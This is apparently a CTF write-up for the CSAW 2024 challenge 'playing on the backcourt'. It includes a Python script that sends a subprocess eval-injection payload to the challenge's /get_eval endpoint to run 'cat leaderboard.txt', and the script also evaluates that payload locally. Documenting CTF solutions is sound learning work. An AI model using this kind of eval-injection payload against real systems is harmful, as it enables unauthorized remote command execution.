---
title: CSAW 2024 playing on the backcourt
draft: false
tags:
  - ctf
---

# playing on the backcourt

> yadayada playing tennis like pong yadayada someone's cheating yadayada at least the leaderboard is safe!

Looking through all the endpoints, you can simply make a `POST /get_eval` and you basically get RCE. Unsure if this was intended, but simple enough:

```python
import requests

def deep_eval(expr:str) -> str:
    try:
        nexpr = eval(expr)
    except Exception as e:
        return expr
    
    return deep_eval(nexpr)

cmd = "__import__('subprocess').check_output('cat leaderboard.txt', shell=True).decode()"

print(deep_eval(cmd))

BASE = 'https://backcourts.ctf.csaw.io/'

r = requests.post(BASE+'get_eval',
    json={"expr": cmd}
)

print(r.text)
```